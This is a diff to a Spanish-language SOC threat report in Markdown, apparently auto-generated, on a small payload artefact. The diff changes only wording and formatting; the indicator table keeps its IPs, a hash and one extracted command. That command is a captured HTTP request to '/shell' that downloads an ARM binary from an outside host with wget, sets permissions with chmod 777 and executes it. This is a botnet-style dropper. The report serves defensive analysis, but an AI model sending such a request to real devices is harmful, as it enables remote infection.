@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 396 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.38. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:04:38+00:00`
+- **Registrado:** `2026-08-09T20:04:38.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,8 +53,8 @@ GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/94.154.43.XXX/arm7;chmod+777+arm7;./
 | --- | --- | --- |
 | ip | 190.179.168.XXX | static_analysis |
 | ip | 94.154.43.XXX | static_analysis |
-| hash | 6edd24171fe2fe222a65e5edc6d4313de30f7f2e90676d58a2b316118cdb1d55 | static_analysis |
 | command | GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/94.154.43.XXX/arm7;chmod+777+arm7;./arm7 HTTP/1.1 | strings |
+| hash | 6edd24171fe2fe222a65e5edc6d4313de30f7f2e90676d58a2b316118cdb1d55 | static_analysis |
 
 ## 🔎 Triage
 
